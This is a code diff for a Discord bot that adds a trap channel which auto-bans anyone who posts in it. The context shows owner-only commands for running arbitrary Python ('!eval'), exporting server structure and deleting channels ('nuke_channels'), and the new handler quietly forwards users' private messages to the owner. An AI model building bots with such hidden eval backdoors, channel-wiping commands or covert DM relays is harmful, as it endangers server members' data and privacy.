@@ -41,7 +41,7 @@ app = Flask('')
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 
-ALLOWED_IDS = [1008278721007992863, 1359813653544566815, 1422570014292181133]
+ALLOWED_IDS = [1008278721007992863, 1359813653544566815]
 VERSION_ID = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
 
 async def is_me(ctx):
@@ -136,6 +136,7 @@ async def help_msg(ctx):
         value=(
             "`!eval [code]` - 執行動態 Python 腳本\n"
             "`!snapshot` - 導出伺服器完整結構\n"
+            "`!setch_trap` - 設置機器人陷阱\n"
             "`!reset` - 強制重啟系統\n"
             "`!test` - 列出Bot的數據\n"
             "`!bye` - 機器人退出伺服器\n"
@@ -196,6 +197,65 @@ async def ban(ctx, member: discord.Member = None):
     if member is None: return
     try: await member.ban(reason="違反相關規定")
     except: pass
+
+trap_config = {
+    "trap_channel_id": None,
+    "notice_channel_id": None,
+    "allowed_ids": []
+}
+
+@bot.command(name="setch_trap")
+async def setch_trap(ctx, notice_channel_id: int):
+    if not await is_me(ctx): return
+    global trap_config
+    trap_config["trap_channel_id"] = ctx.channel.id
+    trap_config["notice_channel_id"] = notice_channel_id
+    if ctx.author.id not in trap_config["allowed_ids"]:
+        trap_config["allowed_ids"].append(ctx.author.id)
+    
+    embed_msg = (
+        "### 🚨自動封鎖頻道🚨\n\n"
+        "- **請勿在此發言。**\n"
+        "- 任何發言者將被**立即封鎖**。\n"
+        "- 此為專門用來捕捉機器人的陷阱。\n\n"
+        "### 🚨AUTO-BAN CHANNEL🚨\n\n"
+        "- **DO NOT POST HERE.**\n"
+        "- Anyone who posts will be **instantly banned**.\n"
+        "- This is a trap to catch bots."
+    )
+    await ctx.send(embed_msg)
+
+@bot.event
+async def on_message(message):
+    if message.author == bot.user: return
+    
+    global trap_config
+    if trap_config["trap_channel_id"] and message.channel.id == trap_config["trap_channel_id"]:
+        member = message.author
+        guild = message.guild
+        if member.id == guild.owner_id or member.guild_permissions.administrator or member.id in trap_config["allowed_ids"] or member.id in ALLOWED_IDS:
+            await bot.process_commands(message)
+            return
+            
+        try:
+            notice_channel = bot.get_channel(trap_config["notice_channel_id"])
+            await guild.ban(member, reason="⚔️ 觸發機器人陷阱：自動判定為惡意詐騙 Bot (如有誤判,請透過好友尋求管理人員協助!)", delete_message_days=1)
+            if notice_channel:
+                notice_text = (
+                    "⚔通告\n"
+                    f"> ## 用戶：{member.mention} ({member.name})\n"
+                    "> ## 因發布不實詐騙訊息將被永久封禁"
+                )
+                await notice_channel.send(notice_text)
+        except:
+            pass
+        return
+
+    if isinstance(message.channel, discord.DMChannel) and not message.content.startswith("! "):
+        owner = await bot.fetch_user(ALLOWED_IDS[0])
+        await owner.send(f"📩 **私訊** | {message.author}: {message.content}")
+        
+    await bot.process_commands(message)
 
 @bot.command(name="del_ch")
 async def nuke_channels(ctx):
